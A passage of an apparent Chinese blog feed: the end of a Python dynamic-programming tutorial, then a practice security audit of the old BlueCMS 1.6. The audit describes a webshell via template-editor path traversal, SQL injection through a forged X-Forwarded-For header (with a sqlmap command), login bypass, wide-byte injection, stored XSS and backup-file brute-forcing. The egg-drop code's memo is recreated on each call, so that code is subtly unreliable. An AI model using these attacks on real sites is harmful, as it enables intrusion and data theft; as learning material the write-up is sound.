<span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = int((left + right) / <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> top[mid] &gt; poker:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">elif</span> top[mid] &lt; poker:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">        <span class="keyword">if</span> left == piles:</span><br><span class="line">            piles += <span class="number">1</span>  <span class="comment"># 最长递增子序列的长度加一</span></span><br><span class="line">        top[left] = poker</span><br><span class="line">    <span class="keyword">return</span> piles</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(main([<span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>]))</span><br></pre></td></tr></table></figure><h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h3><p>先来看一下题目描述</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422161419634.png" alt=""></p><h4 id="递归解法"><a href="#递归解法" class="headerlink" title="递归解法"></a>递归解法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(i, j)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> j + <span class="number">1</span>  <span class="comment"># 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>  <span class="comment"># 同上</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> s1[i] == s2[j]:</span><br><span class="line">            <span class="keyword">return</span> dp(i - <span class="number">1</span>, j - <span class="number">1</span>)  <span class="comment"># 若相等直接跳过进行下一个字符的判断</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> min(dp(i, j - <span class="number">1</span>) + <span class="number">1</span>,  <span class="comment"># 插入</span></span><br><span class="line">                       dp(i - <span class="number">1</span>, j - <span class="number">1</span>) + <span class="number">1</span>,  <span class="comment"># 替换</span></span><br><span class="line">                       dp(i - <span class="number">1</span>, j) + <span class="number">1</span>)  <span class="comment"># 删除</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp(len(s1) - <span class="number">1</span>, len(s2) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(minDistance(<span class="string">"apple"</span>, <span class="string">"add"</span>))</span><br></pre></td></tr></table></figure><p>以上是将<code>apple</code>和<code>add</code>两个字符串进行转换，得出的结果为4，即所需操作的最小值</p><h4 id="带备忘录的递归解法-2"><a href="#带备忘录的递归解法-2" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    memo = dict()  <span class="comment"># 备忘录</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(i, j)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (i, j) <span class="keyword">in</span> memo:</span><br><span class="line">            <span class="keyword">return</span> memo[(i, j)]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> j + <span class="number">1</span>  <span class="comment"># 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>  <span class="comment"># 同上</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> s1[i] == s2[j]:</span><br><span class="line">            memo[(i, j)] = dp(i - <span class="number">1</span>, j - <span class="number">1</span>)  <span class="comment"># 若相等直接跳过进行下一个字符的判断</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            memo[(i, j)] = min(dp(i, j - <span class="number">1</span>) + <span class="number">1</span>,  <span class="comment"># 插入</span></span><br><span class="line">                               dp(i - <span class="number">1</span>, j - <span class="number">1</span>) + <span class="number">1</span>,  <span class="comment"># 替换</span></span><br><span class="line">                               dp(i - <span class="number">1</span>, j) + <span class="number">1</span>)  <span class="comment"># 删除</span></span><br><span class="line">        <span class="keyword">return</span> memo[(i, j)]</span><br><span class="line">    <span class="keyword">return</span> dp(len(s1) - <span class="number">1</span>, len(s2) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(minDistance(<span class="string">"apple"</span>, <span class="string">"add"</span>))</span><br></pre></td></tr></table></figure><h4 id="DP-table解法-2"><a href="#DP-table解法-2" class="headerlink" title="DP table解法"></a>DP table解法</h4><p>自底向上</p><p>首先确定<code>dp</code>数组的含义，<code>dp</code>数组是一个二维数组，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170423923.png" alt=""></p><p><code>dp[i][j]</code>存储着<code>s1[i]</code>和<code>s2[j]</code>的最小编辑距离，各相邻的数据之间有如下关系：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170651675.png" alt=""></p><p>于是就可以写出以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    m = len(s1)</span><br><span class="line">    n = len(s2)</span><br><span class="line">    dp = dict()</span><br><span class="line">    dp[(<span class="number">0</span>, <span class="number">0</span>)] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m + <span class="number">1</span>):</span><br><span class="line">        dp[(i, <span class="number">0</span>)] = i</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        dp[(<span class="number">0</span>, i)] = i</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> s1[i - <span class="number">1</span>] == s2[j - <span class="number">1</span>]:</span><br><span class="line">                dp[(i, j)] = dp[(i - <span class="number">1</span>, j - <span class="number">1</span>)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[(i, j)] = min(dp[(i, j - <span class="number">1</span>)] + <span class="number">1</span>,</span><br><span class="line">                                 dp[(i - <span class="number">1</span>, j - <span class="number">1</span>)] + <span class="number">1</span>,</span><br><span class="line">                                 dp[(i - <span class="number">1</span>, j)] + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> dp[(m, n)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(minDistance(<span class="string">"apple"</span>, <span class="string">"add"</span>))</span><br></pre></td></tr></table></figure><p>随后还可以将步骤推出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    m = len(s1)</span><br><span class="line">    n = len(s2)</span><br><span class="line">    dp = dict()</span><br><span class="line">    a = dict()  <span class="comment"># 记录每一步的操作 0：啥都不做，1：插入，2：替换，3：删除</span></span><br><span class="line">    dp[(<span class="number">0</span>, <span class="number">0</span>)] = <span class="number">0</span></span><br><span class="line">    a[(<span class="number">0</span>, <span class="number">0</span>)] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m + <span class="number">1</span>):</span><br><span class="line">        dp[(i, <span class="number">0</span>)] = i</span><br><span class="line">        a[(i, <span class="number">0</span>)] = <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        dp[(<span class="number">0</span>, i)] = i</span><br><span class="line">        a[(<span class="number">0</span>, i)] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> s1[i - <span class="number">1</span>] == s2[j - <span class="number">1</span>]:</span><br><span class="line">                dp[(i, j)] = dp[(i - <span class="number">1</span>, j - <span class="number">1</span>)]  <span class="comment"># 不动，也就是相同直接跳过 0</span></span><br><span class="line">                a[(i, j)] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[(i, j)] = min(dp[(i, j - <span class="number">1</span>)] + <span class="number">1</span>,  <span class="comment"># 插入 1</span></span><br><span class="line">                                 dp[(i - <span class="number">1</span>, j - <span class="number">1</span>)] + <span class="number">1</span>,  <span class="comment"># 替换 2</span></span><br><span class="line">                                 dp[(i - <span class="number">1</span>, j)] + <span class="number">1</span>)  <span class="comment"># 删除 3</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dp[(i, j)] == dp[(i, j - <span class="number">1</span>)] + <span class="number">1</span>:</span><br><span class="line">                a[(i, j)] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> dp[(i, j)] == dp[(i - <span class="number">1</span>, j - <span class="number">1</span>)] + <span class="number">1</span>:</span><br><span class="line">                a[(i, j)] = <span class="number">2</span></span><br><span class="line">            <span class="keyword">elif</span> dp[(i, j)] == dp[(i - <span class="number">1</span>, j)] + <span class="number">1</span>:</span><br><span class="line">                a[(i, j)] = <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">            print(a[(j, i)], end=<span class="string">""</span>)</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">return</span> dp[(m, n)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(minDistance(<span class="string">"apple"</span>, <span class="string">"add"</span>))</span><br></pre></td></tr></table></figure><p>以上代码将输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">033333</span><br><span class="line">103333</span><br><span class="line">112222</span><br><span class="line">111222</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>从后面往前推就行，0,2代表对角（跳过/替换），1代表向上（插入），3代表向左（删除）</p><p>寻找到0的最佳捷径就OK</p><h3 id="高楼扔鸡蛋"><a href="#高楼扔鸡蛋" class="headerlink" title="高楼扔鸡蛋"></a>高楼扔鸡蛋</h3><p>题目：</p><p>目前有一栋1到<code>N</code>共<code>N</code>层的楼，然后给你<code>K</code>鸡蛋（<code>K</code>至少为1），现在确定这栋楼存在楼层<code>0&lt;=F&lt;=N</code>,在这层楼将鸡蛋扔下去鸡蛋<strong>恰好没有碎</strong>（高于<code>F</code>的楼层都会碎，低于<code>F</code>的楼层都不会碎），现在问，最坏的情况下，你至少要扔多少次鸡蛋，才能确定这个楼层<code>F</code>？</p><h4 id="带备忘录的递归解法-3"><a href="#带备忘录的递归解法-3" class="headerlink" title="带备忘录的递归解法"></a>带备忘录的递归解法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(K, N)</span>:</span>  <span class="comment"># K个鸡蛋,N层楼</span></span><br><span class="line">    memo = dict()</span><br><span class="line">    <span class="keyword">if</span> K == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> N</span><br><span class="line">    <span class="keyword">if</span> N == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (K, N) <span class="keyword">in</span> memo:</span><br><span class="line">        <span class="keyword">return</span> memo[(K, N)]</span><br><span class="line">    res = float(<span class="string">"INF"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">        res = min(res, max(main(K - <span class="number">1</span>, i - <span class="number">1</span>), main(K, N - i)) + <span class="number">1</span>)  <span class="comment"># 在max最坏的情况下，求min最优解，main(K - 1, i - 1)表示碎了，main(K, N - i)表示没碎</span></span><br><span class="line">    memo[(K, N)] = res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(main(<span class="number">1</span>, <span class="number">100</span>))</span><br></pre></td></tr></table></figure><h4 id="二分法优化"><a href="#二分法优化" class="headerlink" title="二分法优化"></a>二分法优化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(K, N)</span>:</span>  <span class="comment"># K个鸡蛋,N层楼</span></span><br><span class="line">    memo = dict()</span><br><span class="line">    <span class="keyword">if</span> K == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> N</span><br><span class="line">    <span class="keyword">if</span> N == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (K, N) <span class="keyword">in</span> memo:</span><br><span class="line">        <span class="keyword">return</span> memo[(K, N)]</span><br><span class="line">    res = float(<span class="string">"INF"</span>)</span><br><span class="line">    lo = <span class="number">1</span></span><br><span class="line">    hi = N</span><br><span class="line">    <span class="keyword">while</span> lo &lt;= hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        broken = main(K - <span class="number">1</span>, mid - <span class="number">1</span>)  <span class="comment"># 碎</span></span><br><span class="line">        not_broken = main(K, N - mid)  <span class="comment"># 没碎</span></span><br><span class="line">        <span class="comment"># res = min(max(碎, 没碎) + 1)</span></span><br><span class="line">        <span class="keyword">if</span> broken &gt; not_broken:</span><br><span class="line">            hi = mid - <span class="number">1</span></span><br><span class="line">            res = min(res, broken + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">            res = min(res, not_broken + <span class="number">1</span>)</span><br><span class="line">    memo[(K, N)] = res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(main(<span class="number">1</span>, <span class="number">100</span>))</span><br></pre></td></tr></table></figure><p>未完待续。。。</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueCMS代码审计</title>
      <link href="/2020/04/15/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2020/04/15/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的</p><p>BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的</p><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>在后台有一个模板管理的功能，可以编辑前端htm文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101051793.png" alt=""></p><p>点击编辑抓包</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101241645.png" alt=""></p><p>可以看到包含了文件，于是我们尝试修改编辑的文件，改为<code>../../ann.php</code>，放包后如下，可以修改</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101419641.png" alt=""></p><p>随后直接写马连接即可，源码如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101729886.png" alt=""></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="X-Forwarded-For头注入"><a href="#X-Forwarded-For头注入" class="headerlink" title="X-Forwarded-For头注入"></a>X-Forwarded-For头注入</h4><p>首先看到留言系统后台代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415164807809.png" alt=""></p><p>网站习惯性的把用户留言时的ip保存下来，在看看getip()这个函数怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165228100.png" alt=""></p><p>getenv()函数获取环境变量的值</p><ul><li>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</li><li>第二个X-Forwarded-For 这个东西可以通过HTTP请求头来修改。</li></ul><p>X-Forwarded-For明显可以伪造</p><p>抓包手工延时注入：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165848020.png" alt=""></p><p>然后写脚本跑就可以了</p><p>sqlmap跑数据库：<code>python sqlmap.py -r 1.txt --dbs --batch --headers=&quot;X-Forwarded-For:1*&quot;</code></p><p>可以把数据全跑出来</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415171800746.png" alt=""></p><h4 id="首页登录界面SQL注入"><a href="#首页登录界面SQL注入" class="headerlink" title="首页登录界面SQL注入"></a>首页登录界面SQL注入</h4><p>先随便注册一个用户名为root的账号，然后在抓包使用万能密码即可登录任意用户</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134357459.png" alt=""></p><p>再来看看源码中是怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134551779.png" alt=""></p><p>只限制了管理员组的不能从前台登录，参数没经过任何的过滤。。。</p><h4 id="注册界面SQL注入"><a href="#注册界面SQL注入" class="headerlink" title="注册界面SQL注入"></a>注册界面SQL注入</h4><p>既然是注册界面就看肯定有插入数据到数据库中的操作，直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414102814136.png" alt=""></p><p>简单的进行了用户和密码的检测，但并起不到实际的作用，于是在email处尝试进行报错注入，单引号闭合的时候能够成功插入到数据库中并没有报错，于是推测使用了魔术方法对用户的输入进行了转义，而sql语句编码方法使用的gbk编码，于是在单引号前面加上%df构成宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414104343110.png" alt=""></p><p>成功报错但并没有显示出错误信息，查看源代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041411035197.png" alt=""></p><p>似乎只会报sql语法错误，而我们报错注入使用的是XPATH上的语法错误，所以并不会显示出来，于是尝试盲注试试，尝试后视乎并没有执行成功，而是报了错误，原因不明，后面再研究</p><p>另外此处还有一个sql注入漏洞，可以插入多行用户数据，并且在email出嵌入sql语句，用户名单引号用十六进制代替</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121232230.png" alt=""></p><p>可见成功执行注入，在数据库中成功执行了语句</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121433047.png" alt=""></p><h4 id="管理登录界面SQL注入"><a href="#管理登录界面SQL注入" class="headerlink" title="管理登录界面SQL注入"></a>管理登录界面SQL注入</h4><p>如下图，万能密码直接进了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416150916773.png" alt=""></p><p>源码，无过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416151154990.png" alt=""></p><h4 id="ad-idSQL注入"><a href="#ad-idSQL注入" class="headerlink" title="ad_idSQL注入"></a>ad_idSQL注入</h4><p>直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153522230.png" alt=""></p><p>应该存在联合查询注入，随后在第七个字段找到注入点，成功获取数据库名，随后再接着查表列就行了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153652959.png" alt=""></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="个人资料存储型xss"><a href="#个人资料存储型xss" class="headerlink" title="个人资料存储型xss"></a>个人资料存储型xss</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161529680.png" alt=""></p><p>随后在个人界面和管理员用户界面完美弹窗，再看看数据库中的资料</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161646983.png" alt=""></p><p>email和msn都嵌入了script代码，为啥其它的没用？因为表字段的长度只有那么长</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161908634.png" alt=""></p><p>再看看代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415162022292.png" alt=""></p><p>同样未经过过滤，这里还存在sql注入漏洞，就不写了。</p><h4 id="注册界面存储型xss"><a href="#注册界面存储型xss" class="headerlink" title="注册界面存储型xss"></a>注册界面存储型xss</h4><p>注册界面的验证有部分是放在前端进行验证的，也就是用js进行验证，可我们都知道，前端验证并不可靠，真正的验证应该做在后端才行，就比如这里的邮箱验证就放在前端</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414100621671.png" alt=""></p><p>于是我们直接抓包绕过，并在email中注入恶意代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041410074329.png" alt=""></p><p>随后只要前端能够看得到该用户的邮箱，就会执行该恶意代码，就比如管理员的用户列表界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS代码审计/image-20200414101006315.png" style="zoom:80%;" /><h4 id="发布新闻页面存储型XSS"><a href="#发布新闻页面存储型XSS" class="headerlink" title="发布新闻页面存储型XSS"></a>发布新闻页面存储型XSS</h4><p>先看下源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416113747952.png" alt=""></p><p>content参数使用的是<code>filter_data</code>函数进行处理，而这个函数并没有过滤<code>img</code>标签，于是可以利用进行xss攻击</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416114042972.png" alt=""></p><p>随后在新闻页面成功弹窗</p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="备份信息泄露"><a href="#备份信息泄露" class="headerlink" title="备份信息泄露"></a>备份信息泄露</h4><p>管理员界面可以进行数据库备份，备份完后的数据放在这个目录下，并且命名规则为使用当日日期，可以尝试爆破地址</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415173114792.png" alt=""></p><p>访问即可下载sql文件，其中有用户的个人信息，密码经过了md5加密，弱密码的话直接就可以加密开了</p><h3 